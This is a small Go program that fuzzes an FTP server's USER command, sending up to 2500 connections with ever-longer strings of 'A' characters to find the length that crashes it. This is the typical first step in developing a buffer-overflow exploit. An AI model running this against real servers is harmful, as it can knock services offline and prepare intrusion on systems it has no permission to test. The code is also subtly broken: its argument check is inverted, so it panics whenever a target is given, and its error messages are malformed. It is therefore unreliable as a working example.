package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
)

func main() {
	if len(os.Args) != 1 {
		log.Panicln("Please specify your target ip: main <target>")
	}
	for i := 0; i < 2500; i++ {

		conn, err := net.Dial("tcp", os.Args[1])
		if err != nil {
			log.Fatalln("Error at offset ,server failure", i, err)
		}

		bufio.NewReader(conn).ReadString('\n')
		user := ""
		for n := 0; n <= i; n++ {
			user += "A"
		}

		raw := "USER %s\n"
		fmt.Fprintf(conn, raw, user)
		bufio.NewReader(conn).ReadString('\n')
		if err := conn.Close(); err != nil {
			log.Printf("[1] Error at offset %d: %s \n", i, err)
		}
	}
}
